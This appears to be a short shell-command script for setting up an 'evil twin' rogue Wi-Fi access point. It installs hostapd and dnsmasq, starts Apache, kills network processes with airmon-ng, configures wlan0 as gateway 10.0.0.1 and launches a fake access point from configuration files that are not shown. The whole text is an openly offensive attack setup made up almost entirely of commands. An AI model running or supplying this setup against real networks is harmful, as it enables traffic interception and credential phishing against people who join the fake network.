#before you start!!!!
apt-get install hostapd
apt-get install dnsmasq

#start our apache server
service apache2 start


#stop your network-manager!!!
service network-manager stop

#kill all process 
airmon-ng check kill

#check your ip in wlan0
ifconfig

#change adapter ip to 10.0.0.1/24
ifconfig wlan0 10.0.0.1/24

#check your ip in wlan0
ifconfig

#add default gw 10.0.0.1
route add default gw 10.0.0.1

#check gw
route -n


#add dnsmasq
dnsmasq -C /root/Desktop/evil-twin/our/dnsmasq-and-hostapd/dnsmask.conf

#open our fake ap
hostapd /root/Desktop/evil-twin/our/dnsmasq-and-hostapd/hostapd.conf


